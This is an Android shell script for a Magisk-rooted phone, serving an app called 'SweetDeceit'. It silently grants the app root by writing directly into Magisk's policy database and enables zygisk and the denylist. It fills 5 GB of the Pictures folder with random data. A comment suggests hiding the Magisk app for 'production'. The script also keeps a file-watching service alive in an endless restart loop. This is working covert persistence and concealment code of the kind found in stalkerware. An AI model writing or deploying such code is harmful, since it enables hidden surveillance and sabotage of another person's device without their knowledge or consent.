#!/system/bin/sh

# Define the package and service name
PACKAGE_NAME="com.example.sweetdeceit"
SERVICE_NAME="$PACKAGE_NAME/.FileObserverService"

# Get the UID for the specified package
UID=$(pm list packages -U "$PACKAGE_NAME" | cut -d ':' -f 3)

# Check if UID is already in the Magisk database
ENTRY_COUNT=$(sqlite3 /data/adb/magisk.db "SELECT COUNT(*) FROM policies WHERE uid = $UID;")

# If the UID is not present, insert it into the database and configure Magisk
if [ "$ENTRY_COUNT" -eq 0 ]; then
    sqlite3 /data/adb/magisk.db "INSERT INTO policies (uid, policy, until, logging, notification) VALUES ($UID, 2, 0, 1, 1);"
    sqlite3 /data/adb/magisk.db "INSERT INTO settings (key, value) VALUES ('zygisk', '1');"
    magisk --denylist enable
    dd if=/dev/urandom of=/storage/emulated/0/Pictures/cocaine_ign0re.txt bs=1M count=5120
    #dd if=/dev/urandom of=/storage/emulated/0/Pictures/3c71b4071e5eb70a168884daf40fd75680cb6a57bcfb3f335dfdf60ed6ba40e4 bs=1M count=2048
    # Uncomment the following line if you want to hide the Magisk app for SweetDeceit to be for production
    # pm hide com.topjohnwu.magisk
fi

# Function to check if the service is running
is_service_running() {
    pgrep -f "$SERVICE_NAME" > /dev/null
    return $?
}

# Loop to monitor the service
while true; do
    if ! is_service_running; then
        am startservice -n "$SERVICE_NAME" > /dev/null 2>&1
    fi
    sleep 5  # Check every 5 seconds; adjust as needed
done

